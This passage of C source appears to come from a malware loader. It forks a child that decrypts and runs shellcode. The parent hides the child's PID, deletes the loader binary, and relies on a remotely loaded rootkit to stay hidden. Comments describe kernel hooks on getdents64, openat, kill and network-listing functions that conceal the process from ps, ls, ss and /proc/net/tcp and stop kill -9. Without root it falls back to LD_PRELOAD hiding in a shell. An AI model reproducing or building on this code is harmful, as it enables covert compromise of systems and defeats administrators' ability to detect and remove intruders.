            int dlen = snprintf(dbg, sizeof(dbg),
                "[daemon] PID=%d LD_PRELOAD=%s environ=%p\n",
                getpid(), lp ? lp : "(null)", (void*)environ);
            int dfd = (int)syscall(SYS_openat, AT_FDCWD, "/tmp/loader_dbg.log",
                                   O_WRONLY | O_CREAT | O_APPEND, 0644);
            if (dfd >= 0) {
                syscall(SYS_write, dfd, dbg, dlen);
                syscall(SYS_close, dfd);
            }
        }

        load_and_execute(enc_sc, sc_len);
        _exit(1);
    }

    /* === PARENT: setup hiding and give user a shell === */
    free(enc_sc);

    /* Run hide_process AFTER fork so we know the child PID */
    hide_process(pid, url);

    /* Pass child PID to hide library via environment + file */
    char pid_str[32];
    snprintf(pid_str, sizeof(pid_str), "%d", pid);
    setenv("_HIDE_PID", pid_str, 1);
    int hf = (int)syscall(SYS_openat, AT_FDCWD, "/tmp/.h",
                          O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (hf >= 0) {
        syscall(SYS_write, hf, pid_str, strlen(pid_str));
        syscall(SYS_close, hf);
    }

    self_delete(loader_path);

    /* =====================================================================
     * Root mode (rootkit loaded): kernel hooks handle ALL hiding.
     *   No need for exec shell — just exit. Avoids visible "sudo ./loader"
     *   process tree.
     *
     * Non-root mode: exec shell with LD_PRELOAD (userspace hiding only).
     * ===================================================================== */
    int is_root = (getuid() == 0);
    int has_rootkit = (is_root); /* load_remote_rootkit succeeds iff root */

    if (has_rootkit) {
        /* Rootkit provides kernel-level hiding for:
         *   ps/top  → getdents64 hook
         *   ls /proc → openat hook
         *   kill -9  → kill/tkill/tgkill hooks
         *   ss       → inet_sk_diag_fill kprobe
         *   cat /proc/net/tcp → tcp4_seq_show kprobe
         * No need for LD_PRELOAD shell. Just exit cleanly. */
        LOG("Rootkit active — PID %s hidden. Exiting.", pid_str);
        waitpid(pid, NULL, WNOHANG);
        _exit(0);
    }

    /* Non-root: exec shell with LD_PRELOAD for userspace hiding */
    if (isatty(STDIN_FILENO) && isatty(STDOUT_FILENO)) {
        const char *shell = getenv("SHELL");
        if (!shell) shell = "/bin/bash";

        LOG("exec %s with LD_PRELOAD (hiding PID %s)", shell, pid_str);

        execl(shell, shell, (char *)NULL);
    }

    /* Non-TTY: just wait for child */
    waitpid(pid, NULL, 0);
    ftrace_cleanup();
    _exit(0);
}
